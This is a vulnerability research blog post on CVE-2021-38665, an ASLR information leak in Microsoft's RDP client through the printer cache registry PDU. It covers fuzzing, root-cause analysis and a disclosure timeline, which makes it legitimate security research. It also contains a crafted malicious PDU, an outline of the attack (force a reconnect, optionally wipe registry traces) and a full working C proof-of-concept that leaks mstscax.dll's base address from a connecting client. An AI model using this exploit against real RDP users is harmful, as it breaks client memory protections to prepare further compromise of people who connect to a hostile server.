---
title: "Remote ASLR Leak in Microsoft's RDP Client through Printer Cache Registry (CVE-2021-38665)"
date: 2021-12-10T06:00:00+01:00
draft: false
author: "Valentino Ricotta"
tags:
  - RDP
  - Exploit
  - CVE
  - Vulnerability Research
  - ASLR
---

This is the **second installment** in my three-part series of articles on fuzzing Microsoft's RDP client. I will explain a bug I found by fuzzing the **printer sub-protocol**, and how I exploited it.

<!--more-->

* [MSRC Report: RDP Client Information Disclosure Vulnerability (CVE-2021-38665)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38665)
* CVSS 7.4 (Important)

Other articles in this series:

* [Fuzzing Microsoft's RDP Client using Virtual Channels: Overview & Methodology](/posts/fuzzing-microsoft-rdp-client-using-virtual-channels/)
* [Remote ASLR Leak in Microsoft's RDP Client through Printer Cache Registry (CVE-2021-38665)](/posts/leaking-aslr-through-rdp-printer-cache-registry/)
* [Remote Deserialization Bug in Microsoft's RDP Client through Smart Card Extension (CVE-2021-38666)](/posts/deserialization-bug-through-rdp-smart-card-extension/)

## Table of Contents

- [Introduction](#introduction)
- [Fuzzing RDPDR, the *File System Virtual Channel Extension*](#fuzzing-rdpdr-the-file-system-virtual-channel-extension)
- [Strange registry shenanigans](#strange-registry-shenanigans)
- [Leaking heap through the client registry](#leaking-heap-through-the-client-registry)
- [Getting the leak back to the server](#getting-the-leak-back-to-the-server)
- [Building the exploit](#building-the-exploit)
- [Conclusion](#conclusion)
- [Disclosure Timeline](#disclosure-timeline)
- [Full Proof-of-Concept source code](#full-proof-of-concept-source-code)

# Introduction

The **Remote Desktop Protocol (RDP)** is a proprietary protocol designed by Microsoft which allows the user of an *RDP client software* to connect to a remote computer over the network with a graphical interface. Its use around the world is very widespread; some people, for instance, use it often for remote work and administration.

Most of vulnerability research is concentrated on the RDP *server*. However, some critical vulnerabilities have also been found in the past in the RDP *client*, which would allow a compromised server to attack a client that connects to it.

At Blackhat Europe 2019, a team of researchers showed they [found an RCE](https://www.unexploitable.systems/papers/park:rdpfuzzing-slides.pdf) in the RDP client. Their motivation was that North Korean hackers would alledgely carry out attacks through RDP servers acting as proxies, and that you could hack them back by setting up a malicious RDP server to which they would connect.

During my internship at Thalium, I spent time studying and reverse engineering Microsoft RDP, learning about fuzzing, and looking for vulnerabilities.

In this article, I will explain how I found and exploited a vulnerability in the Microsoft RDP client that allows to leak some remote heap and break the client ASLR. It is not the most convoluted of bugs, nor the most spectacular, but I think it is kind of amusing.

If you are interested in details about the **Remote Desktop Protocol**, **reversing** the Microsoft RDP client or **fuzzing** methodology, I invite you to read **[my first article](/posts/fuzzing-microsoft-rdp-client-using-virtual-channels/)** which tackles these subjects.

Either way, I will briefly provide some context required to understand this article:
* The target is Microsoft's official RDP client on Windows 10.
* Executable is `mstsc.exe` (in system32), but the main DLL for most of the client logic is `mstscax.dll`.
* RDP uses the abstraction of **virtual channels**, a layer for transporting data.
  * For instance, the channel `RDPSND` is used for audio redirection, and the channel `CLIPRDR` is used for clipboard synchronization.
* Each channel behaves according to separate logic and its own protocol, which official specification can often be found in Microsoft docs.
* Virtual channels are a great attack surface and a **good entrypoint for fuzzing**.
* I fuzzed virtual channels with a modified version of **WinAFL** and a network-level harness.

# Fuzzing RDPDR, the *File System Virtual Channel Extension*

**`RDPDR`** is the name of the static virtual channel which purpose is to **redirect access from the server to the client file system**. It is also the base channel that hosts several **sub-extensions** such as the smart card extension, the **printing extension** or the serial/parallel ports extension.

`RDPDR` is one of the few channels that are **opened by default** in the RDP client, alongside other static channels `RDPSND`, `CLIPRDR`, `DRDYNVC`. This makes it an even more interesting target risk-wise.

Microsoft has some nice [documentation](https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-RDPEFS/%5bMS-RDPEFS%5d.pdf) on this channel. It contains the different PDU types, their structures, and even dozens of examples of PDUs which is great for seeding our fuzzer.

Fuzzing `RDPDR` yielded a few small bugs, as well as another bug for which I got a CVE (see my next article: [Remote Deserialization Bug in Microsoft's RDP Client through Smart Card Extension](/posts/deserialization-bug-through-rdp-smart-card-extension/)).

What's interesting though, is that while I found the vulnerability I am going to explain by fuzzing, the *crashes* WinAFL found were not what led me to discover this bug at all. Rather, it was the prolonged fuzzing and the millions of executions that unveiled **unexpected side effects** the server could have on the client's system.

# Strange registry shenanigans

I was heavily fuzzing the RDPDR channel, and at some point my RDP client just broke. Not broke like in crash once and forget about it; everytime I would start the client, it would eat up a stupid amount of memory until eventually hanging the whole system. No reboot or RDP cache clear would help.

I fired up [Procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon), and noticed an unusually large proportion of the operations performed by the client upon starting were actually **registry operations**. More specifically, it kept iterating on keys inside `HKCU\Software\Microsoft\Terminal Server Client\Default\AddIns\RDPDR`, and the more keys, the worse the memory consumption.

This fact alone is already very annoying for a client: it is even worse than a simple crash or arbitrary memory allocation. Since the bug is persistent, it entirely prevents you from using RDP ever again, unless you *specifically* know how to fix the problem by deleting the correct keys in the registry.

![Procmon showing garbage keys being created in the registry](/posts/img/rdp/procmon-registry-garbage.png "Procmon showing garbage keys being created in the registry")

So are we able to pollute this part of the registry with **arbitrary subkey names**? The answer is yes.

These names are actually WinAFL mutations, and they are interpreted as UTF-16, hence the many garbage chinese characters.

I looked for references to registry operations in `mstscax.dll` and correlated my findings with the [**printer subprotocol specification**](https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-RDPEPC/[MS-RDPEPC].pdf).

![Add Printer Cachedata PDU specification](/posts/img/rdp/dr_prn_add_cachedata.png "Add Printer Cachedata PDU structure from the specification")

The PDU type "Add Printer Cachedata" (`DR_PRN_ADD_CACHEDATA`) is responsible for creating these registry keys. A bit of reversing will quickly show you that you totally control the key name (`PrinterName`), and to a certain extent, contents too.

```cpp
__int64 W32DrPRN::AddPrinterCacheInfo(DR_PRN_ADD_CACHEDATA * PduBody, unsigned int PduBodyLength)
{
  DWORD dwDisposition;
  HKEY phkResult, hKey;

  // ...
  // W32DrPRN::_maxCacheDataSize = 500000 bytes
  if (PduBodyLength < 0x18 ||
      PduBody->PrintNameLen == 0 ||
      PduBody->PnPNameLen > W32DrPRN::_maxCacheDataSize ||
      PduBody->DriverNameLen > W32DrPRN::_maxCacheDataSize ||
      PduBody->PrintNameLen > W32DrPRN::_maxCacheDataSize ||
      PduBody->CachedFieldsLen > W32DrPRN::_maxCacheDataSize) {
    // Error
  }

  unsigned int TotalLen = 24 + PduBody->PnPNameLen + PduBody->DriverNameLen + PduBody->PrintNameLen + PduBody->CachedFieldsLen;

  if (TotalLen > PduBodyLength) { /* Error */ }
  if (TotalLen > W32DrPRN::_maxCacheDataSize) { /* Error */ }

  const WCHAR * PrinterName = (const WCHAR *)((char *)PduBody + 24 + PduBody->PnPNameLen + PduBody->DriverNameLen);

  RegCreateKeyExW(
    HKEY_CURRENT_USER,
    L"Software\\Microsoft\\Terminal Server Client\\Default\\AddIns\\RDPDR",
    0,
    0,
    0,
    0xF003F,
    0,
    &hKey,
    &dwDisposition
  );

  RegCreateKeyExW(hKey, PrinterName, 0, 0, 0, 0xF003F, 0, &phkResult, &dwDisposition);
  
  RegSetValueExW(phkResult, L"PrinterCacheData", 0, 3, (const BYTE *)PduBody, TotalLen);
  
  // ...
}
```

I don't think you can do much damage inside the registry itself with this kind of creation-of-a-subkey-with-arbitrary-name primitive. For instance, there is no such thing as a path traversal attack. 

However, something really bugged me out. Some key names in the registry seemed **longer than usual**, which made me think there could be an issue with **length management**.

I couldn't find anything as interesting as controlling the size of an out-of-bounds through the different length fields, be it in this PDU type (Add Printer Cachedata) or other ones (Update Printer Cachedata, Rename Printer Cachedata...).

Therefore, the bug naturally comes from the fact that the server can send a **non-null-terminated wide string** to the client as the `PrinterName`. It is naively passed to `RegCreateKeyExW` (the second one), which will create the key assuming its name stops at the first wide null-byte (two consecutive null bytes). 

# Leaking heap through the client registry

Here is an example of a malicious PDU that will trigger the bug:

```c
char leak_heap[] = {
  // DR_PRN_ADD_CACHEDATA
  0x52, 0x50, 0x43, 0x50,                         // Header
  0x01, 0x00, 0x00, 0x00,                         // EventId
  0x43, 0x4f, 0x4d, 0x32, 0x00, 0x00, 0x3a, 0x00, // PortDosName
  0x00, 0x00, 0x00, 0x00,                         // PnpNameLen
  0x2a, 0x00, 0x00, 0x00,                         // DriverNameLen
  0x2a, 0x00, 0x00, 0x00,                         // PrintNameLen
  0x00, 0x00, 0x00, 0x00,                         // CachedFieldsLen
  // DriverName
  0x42, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x74,
  0x00, 0x68, 0x00, 0x65, 0x00, 0x72, 0x00,
  0x20, 0x00, 0x44, 0x00, 0x43, 0x00, 0x50,
  0x00, 0x2d, 0x00, 0x31, 0x00, 0x30, 0x00,
  0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x55,
  0x00, 0x53, 0x00, 0x42, 0x00, 0x00, 0x00,
  // PrinterName
  0x42, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x74,
  0x00, 0x68, 0x00, 0x65, 0x00, 0x72, 0x00,
  0x20, 0x00, 0x44, 0x00, 0x43, 0x00, 0x50,
  0x00, 0x2d, 0x00, 0x31, 0x00, 0x30, 0x00,
  0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x55,
  0x00, 0x53, 0x00, 0x42, 0x00, 0x20, 0x00,
  0x61, 0x62, 0x63, 0x64
};
```

The only thing here that is really important to notice is that the `PrinterName` field never contains `0x00 0x00`.

Upon receiving this PDU from the server on the `RDPDR` channel, the client will enter `W32DrPRN::ProcessPrinterCacheInfo` and our message be dispatched to `W32DrPRN::AddPrinterCacheInfo`.

![Path taken by the malicious PDU](/posts/img/rdp/rdpdr_add_printer_cache_graph.png "Path taken by the malicious PDU in mstscax.dll")

Right before the second call to `RegCreateKeyExW`, here's what memory at `PrinterName` can look like:

![Heap memory dump at PrinterName](/posts/img/rdp/bug-2021-06-08-A-memory-dump.png "Heap memory dump at PrinterName")

We can see there is extra data after our `"abcd"` (end of our PrinterName *and* of our PDU). When this buffer (`0x000001352d6ebe6a`) is passed to `RegCreateKeyExW`, it will be copied until the first double null byte is met. Luckily for us, this happens right after an **address leak** (`0x7ffbc16092d8`).



We can confirm by taking a look at the registry right after this call!

![Leakage inside the registry](/posts/img/rdp/bug-2021-06-08-A-registry-leak.png "Leakage inside the registry")

Let's copy the key name and encode it as UTF-16 (little endian):

```python
>>> "Brother DCP-1000 USB 扡摣⢍透䀀退鋘셠翻".encode('utf-16le').hex()
'420072006f00740068006500720020004400430050002d00310030003000300020005500530042002000616263648d280f9000400090d89260c1fb7f'
```

Our address leak does sit right at the end.

Some tests in my environments (Windows 10 20H2 / 10.0.19041.844 and Windows 10 Insider Build / 10.0.21354.1) showed we could most of the time leak a few addresses of this kind. They are specific vtable pointers in `mstscax.dll`, allowing us to retrieve its **base address**.

You can also probably try some heap spray, for instance by opening a lot of dummy dynamic channels and closing them. Dynamic channel managers that are allocated and freed in the heap contain vtable function pointers.

But as long as it stays on the client's machine, there's no harm... right?

# Getting the leak back to the server

We need to find a way to **repatriate the leak** to our server.

Providentially, the following message type exists, and the client is supposed to send it to the server upon initialization of the `RDPDR` virtual channel.

![Client Device List Announce Request PDU specification](/posts/img/rdp/dr_prn_device_announce.png "Client Device List Announce Request PDU structure from the specification")

Therefore, if the victim reconnects to the server, the client will iterate on the registry keys we have tampered with and send them to the server, including our leaks.

We can confirm this easily by setting a breakpoint on `VCManager::ChannelWriteEx` inside `W32ProcObj::PostLogonAnnounceDevicesToServerFunc`, and observing **the client does write our leaks to the channel**.

Two steps now remain:
1. Waiting for the client to reconnect (is it necessary?)
2. Reading from the virtual channel on the server side

Waiting for the client to reconnect is not very satisfactory for a few reasons:
* It's better if the victim doesn't have to perform any action.
* There's a decent chance the victim shuts down their computer after their RDP session, which would then make the ASLR leak irrelevant if they reconnect at a later time.

Now, is there a way to make the client reconnect to the server a bit more seamlessly?

While I was fuzzing other channels, I noticed that if you sent garbage to the dynamic channel `Microsoft::Windows::RDS::Graphics` (which transports bitmap data), the client would show this pop-up window and **automatically reconnect**.

![The connection has been lost...](/posts/img/rdp/connection-lost.png "The connection has been lost...")

Not very subtle or furtive, but it will do for a proof of concept.

Finally, after the client sends the leak, we can send many "Delete Printer Cachedata" PDUs (`DR_PRN_DELETE_CACHEDATA`) to **delete the leaky keys** in the client's registry. This cleans up traces of the attack in it and makes it a bit more stealthy. I will not do it in the POC though, because it requires a bit more effort.

**Let's sum up our current attack scheme:**
1. Send a malicious `DR_PRN_ADD_CACHEDATA` message to the client
2. The client will leak some heap in a registry key name
3. Optionally repeat 1-2 as many times as we want to increase our probability of successfully leaking interesting data
4. Trick the client into reconnecting by corrupting the `Graphics` dynamic channel
5. Receive the leaks upon initialization of the `RDPDR` channel
6. Optionally send `DR_PRN_DELETE_CACHEDATA` PDUs to clean up the client's registry

We can now build our proof-of-concept exploit!

# Building the exploit

Microsoft provides a very useful API called [**WTSAPI32**](https://docs.microsoft.com/en-us/windows/win32/api/wtsapi32/) to open a virtual channel over an RDP session, read from it, write to it, etc.

You can **open a virtual channel** (static or dynamic) this way:

```cpp
HANDLE virtual_channel = WTSVirtualChannelOpenEx(
  WTS_CURRENT_SESSION,
  channel_name,
  is_dynamic ? WTS_CHANNEL_OPTION_DYNAMIC : 0
);
```

Then, we can write to the channel handle this way:

```cpp
WTSVirtualChannelWrite(
  virtual_channel,
  buffer,
  (unsigned long)length,
  &bytes_written
);
```

**Repeat the writing** enough times to increase probability of leaking interesting stuff and we're done with the first steps.

```cpp
for (int k = 0; k < 32; k++)
{
  write_to_virtual_channel(leak_heap, sizeof(leak_heap));
  Sleep(200);
}
```

At this point, the client's registry should be filled with memory leaks.

Next step, we send garbage to the `Graphics` dynamic channel to **make the client reconnect**.

```cpp
connect_to_virtual_channel("Microsoft::Windows::RDS::Graphics", DYNAMIC_CHANNEL);
write_to_virtual_channel("fuzzed up beyond all repair", 27);
close_virtual_channel();

// Wait for the client to reconnect
Sleep(20000);
```

This behavior is a bit random. Sometimes it will automatically reconnect the client, sometimes it will bring the client back to the connection window (without restarting the process) and they will have to click "Connect" again. There are probably other better ways to achieve that.

As for the "wait for the client to reconnect" part, my POC merely sleeps but it could also do better by monitoring when the client exactly reconnects.

The **final step** is to **retrieve the leak** sent by the client. I struggled with this part because I could not simply read from the virtual channel using `WTSVirtualChannelRead`. In order to read from a virtual channel, you need a handle to it, that you got from opening it.

The fact that the PDU is sent upon first initialization of the RDPDR channel, which happens very early when the client connects to the server, complicates things a bit. You need to achieve some kind of race condition to open and read from the channel right after the client connects and sends the packet, but also right before the (real) server itself connects to the channel and handles the packet? I wasn't sure how it'd work so I decided to look for another way.

Possible solutions include:
* Using a custom RDP server implementation
* Intercepting packets at the network level, but it requires decoding the whole RDP stack that has several layers of encryption which is a hassle
* Hooking the server-side handler for the channel in order to log the PDU contents

I eventually opted for **scanning** the RDP server's **svchost memory** to retrieve the client's PDU. It may be overkill, but it works.

Therefore, the rest of the POC is essentially finding the TermService svchost PID, scanning memory with `VirtualQueryEx`/`ReadProcessMemory` and looking for a known crib such as the wide string `Brother` (beginning of our `PrinterName`). Recognizing known vtable offsets then classicly allows to calculate `mstscax.dll`'s base address.

Example run on the Insider Build:

![Leak mstscax.dll base address in Windows Insider Build](/posts/img/rdp/bug-2021-06-08-A-aslr-leak-windows-insider.png "Leak mstscax.dll base address in Windows Insider Build")

# Conclusion

This vulnerability is not necessarily intricate: the core of the bug is just missing null bytes causing an out-of-bounds read. However, the execution makes it more interesting than it should be, and the process of discovering the bug's root cause really shows the unexpected side effects of fuzzing. I believe this latter point is a key component that one should take into account when using fuzzing techniques for vulnerability research.

On a more personal note, for a first experience in vulnerability research, I am glad I was able to find a vulnerability in Windows that led to a CVE and for which I could also provide a reliable proof of concept.

# Disclosure Timeline

* 2021-07-22 --- Sent vulnerability report to MSRC (Microsoft Security Response Center)
* 2021-07-23 --- Microsoft started reviewing and reproducing
* 2021-08-03 --- Microsoft acknowledged the vulnerability and started developing a fix. They also started reviewing this case for a potential bounty award.
* **2021-08-04 --- Microsoft assessed the vulnerability as *Information Disclosure* with *Important* severity. Bounty award: $1,000.**
* 2021-08-13 --- The vulnerability was assigned CVE-2021-38665.
* 2021-11-09 --- Microsoft released the security patch.

# Full Proof-of-Concept source code

```c
/*
Compilation: clang poc.c -o poc.exe -l wsock32 -l wtsapi32 -l advapi32
Run as SYSTEM.
*/

#define _CRT_SECURE_NO_WARNINGS

#include <io.h>
#include <stdlib.h>
#include <stdio.h>
#include <winsock2.h>
#include <winsvc.h>
#include <wtsapi32.h>
#include <windows.h>

#define MAX_VC_WRITE_TRIES 20

#define STATIC_CHANNEL 0
#define DYNAMIC_CHANNEL 1

const unsigned int vtable_offsets[] = {
    // 10.0.19041.844
    0x5c88e0, // const CTSMsg::`vftable`
    0x5c92d8, // const CMemory::`vftable`{for `CImplIUknown<struct IUnknown>`}
    // 10.0.21354.1
    0x62c048, // const CFileRedirector::`vftable'{for `INonDelegatingUnknown'}
    0x62c1b8, // const CTSSyncWaitResult::`vftable'{for `INonDelegatingUnknown'}
    0x62c238, // const CTSMsg::`vftable'{for `CTSObject'}
    0x62dc20, // const CTSPooledUnknown::`vftable'{for `INonDelegatingUnknown'}
    0x62de48  // const CMemory::`vftable'{for `CImplIUnknown<struct IUnknown>'}
};

HANDLE rdp_server;
HANDLE virtual_channel;

void hexdump(char *buffer, int length)
{
    printf("[+] ");
    for (int i = 0; i < length; i++)
    {
        printf("%02x ", (unsigned char)buffer[i]);
    }
    printf("\n");
}

void hook_to_rdp()
{
    rdp_server = WTSOpenServerA("localhost");
    if (!rdp_server)
    {
        printf("[x] Could not open RDP server handle. (%lu)\n", GetLastError());
        exit(1);
    }
    printf("[+] Hooked to local RDP server.\n\n");
}

int connect_to_virtual_channel(char channel_name[], int n_tries, int channel_type)
{
    printf("[+] Attempting to open Virtual Channel...\n");

    int tries = 0;
    while (1)
    {
        tries++;
        if (tries >= n_tries)
        {
            break;
        }
        virtual_channel = WTSVirtualChannelOpenEx(WTS_CURRENT_SESSION, channel_name, channel_type == DYNAMIC_CHANNEL ? WTS_CHANNEL_OPTION_DYNAMIC : 0);
        if (virtual_channel)
        {
            break;
        }
        Sleep(1000);
    }

    if (tries == n_tries)
    {
        printf("[x] Couldn't open Virtual Channel '%s' in %d tries. (%lu)\n", channel_name, tries, GetLastError());
        return 0;
    }

    printf("[+] Opened Virtual Channel '%s' in %d tries.\n", channel_name, tries);
    return 1;
}

int write_to_virtual_channel(char *buffer, int length)
{
    unsigned long bytes_written;
    int tries = 0;

    while (1)
    {
        tries++;
        if (tries >= MAX_VC_WRITE_TRIES)
        {
            break;
        }

        if (WTSVirtualChannelWrite(virtual_channel, buffer, (unsigned long)length, &bytes_written))
        {
            break;
        }
        Sleep(500);
    }

    if (tries == MAX_VC_WRITE_TRIES)
    {
        printf("[x] Could not write to Virtual Channel. (%lu)\n", GetLastError());
        return 0;
    }

    printf("[+] Successfully wrote %lu bytes to Virtual Channel.\n", bytes_written);
    hexdump(buffer, length);

    return 1;
}

void close_virtual_channel()
{
    printf("[+] Closing Virtual Channel.\n\n");
    WTSVirtualChannelClose(virtual_channel);
    CloseHandle(virtual_channel);
}

void close_rdp()
{
    printf("[+] Closing RDP handle.\n");
    WTSCloseServer(rdp_server);
    CloseHandle(rdp_server);
}

DWORD get_termservice_pid()
{
    DWORD bytesNeeded, servicesNum, lastError, pid;
    char serviceName[256];
    printf("\n");

    SC_HANDLE manager = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (manager == INVALID_HANDLE_VALUE)
    {
        printf("[x] Could not open manager. (%lu)\n", GetLastError());
        return 0;
    }

    BOOL status = EnumServicesStatusEx(manager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &bytesNeeded, &servicesNum, NULL, NULL);
    if (!status && (lastError = GetLastError()) != ERROR_MORE_DATA)
    {
        printf("[x] Could not enumerate services. (%lu)\n", lastError);
        return 0;
    }
    PBYTE lpBytes = (PBYTE)malloc(bytesNeeded);
    status = EnumServicesStatusEx(manager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, lpBytes, bytesNeeded, &bytesNeeded, &servicesNum, NULL, NULL);
    if (!status)
    {
        printf("[x] Could not enumerate services. (%lu)\n", GetLastError());
        free(lpBytes);
        return 0;
    }

    ENUM_SERVICE_STATUS_PROCESS *lpServiceStatus = (ENUM_SERVICE_STATUS_PROCESS *)lpBytes;
    for (int i = 0; i < servicesNum; i++)
    {
        if (!strcmp((char *)lpServiceStatus[i].lpServiceName, "TermService"))
        {
            pid = lpServiceStatus[i].ServiceStatusProcess.dwProcessId;
            printf("[+] Found TermService (PID %lu)\n", pid);
            free(lpBytes);
            return pid;
        }
    }

    printf("[x] Could not find TermService.\n");
    free(lpBytes);
    return 0;
}

int main(int argc, char *argv[])
{
    DWORD svchostPid;
    HANDLE hProcess;
    MEMORY_BASIC_INFORMATION info;
    SIZE_T bytesRead;
    LPVOID buffer;
    BYTE *leak;

    char leak_heap[] = {
        // DR_PRN_ADD_CACHEDATA
        0x52, 0x50, 0x43, 0x50,                         // Header
        0x01, 0x00, 0x00, 0x00,                         // EventId
        0x43, 0x4f, 0x4d, 0x32, 0x00, 0x00, 0x3a, 0x00, // PortDosName
        0x00, 0x00, 0x00, 0x00,                         // PnpNameLen
        0x2a, 0x00, 0x00, 0x00,                         // DriverNameLen
        0x2a, 0x00, 0x00, 0x00,                         // PrintNameLen
        0x00, 0x00, 0x00, 0x00,                         // CachedFieldsLen
        // DriverName
        0x42, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x74, 0x00, 0x68, 0x00, 0x65, 0x00, 0x72, 0x00, 0x20, 0x00, 0x44, 0x00, 0x43, 0x00, 0x50,
        0x00, 0x2d, 0x00, 0x31, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x55, 0x00, 0x53, 0x00, 0x42, 0x00, 0x00, 0x00,
        // PrinterName
        0x42, 0x00, 0x72, 0x00, 0x6f, 0x00, 0x74, 0x00, 0x68, 0x00, 0x65, 0x00, 0x72, 0x00, 0x20, 0x00, 0x44, 0x00, 0x43, 0x00, 0x50, 0x00, 0x2d,
        0x00, 0x31, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x55, 0x00, 0x53, 0x00, 0x42, 0x00, 0x20, 0x00, 0x61, 0x62, 0x63, 0x64};

    hook_to_rdp();

    // Connect to RDPDR channel
    if (!connect_to_virtual_channel("rdpdr", 10, STATIC_CHANNEL))
    {
        return 1;
    }

    // Add Printer Cachedata to client registry, several times to increase probability of success
    for (int k = 0; k < 32; k++)
    {
        write_to_virtual_channel(leak_heap, sizeof(leak_heap));
        Sleep(200);
    }

    // Close RDPDR channel
    close_virtual_channel();

    // Trick the client into reconnecting by corrupting the Graphics channel
    // Sometimes it reconnects automatically, sometimes it requires manual action...
    if (!connect_to_virtual_channel("Microsoft::Windows::RDS::Graphics", 10, DYNAMIC_CHANNEL))
    {
        return 1;
    }
    write_to_virtual_channel("fuzzed up beyond all repair", 27);
    close_virtual_channel();

    // Wait for the client to reconnect
    Sleep(20000);

    // The client will send a Device List Announcement upon initialization
    // Retrieve the Device List Announcement (DR_PRN_DEVICE_ANNOUNCE) from svchost memory

    svchostPid = get_termservice_pid();
    if (!svchostPid)
    {
        return 1;
    }

    hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, svchostPid);
    if (!hProcess)
    {
        printf("[x] Could not open svchost process. (%lu)\n", GetLastError());
        return 1;
    }

    for (unsigned char *p = NULL; VirtualQueryEx(hProcess, p, &info, sizeof(info)); p += info.RegionSize)
    {
        if (info.State == MEM_COMMIT && info.Protect != PAGE_NOACCESS && info.Protect != PAGE_GUARD)
        {
            buffer = malloc(info.RegionSize);
            ReadProcessMemory(hProcess, info.BaseAddress, buffer, info.RegionSize, &bytesRead);
            for (int i = 0; i < bytesRead; i++)
            {
                leak = (BYTE *)buffer + i;
                if (!memcmp((char *)leak, (char *)L"Brother", 14))
                {
                    for (int j = 0; j < 256; j++)
                    {
                        if (leak[j + 7] == 0 && leak[j + 6] == 0 && leak[j + 5] == 0x7f)
                        {
                            printf("[+] Found address leak! 0x%p\n", *((char **)(leak + j)));
                            for (int k = 0; k < sizeof(vtable_offsets) / sizeof(vtable_offsets[0]); k++)
                            {
                                if (((*((unsigned long long *)(leak + j))) & 0xFFFF) == (vtable_offsets[k] & 0xFFFF))
                                {
                                    printf("[+] -> Potential base address for mstscax.dll: 0x%p\n", *((char **)(leak + j)) - vtable_offsets[k]);
                                }
                            }
                            // hexdump((char *)leak, 256);
                        }
                    }
                }
            }
            free(buffer);
        }
    }

    close_rdp();
    return 0;
}
```
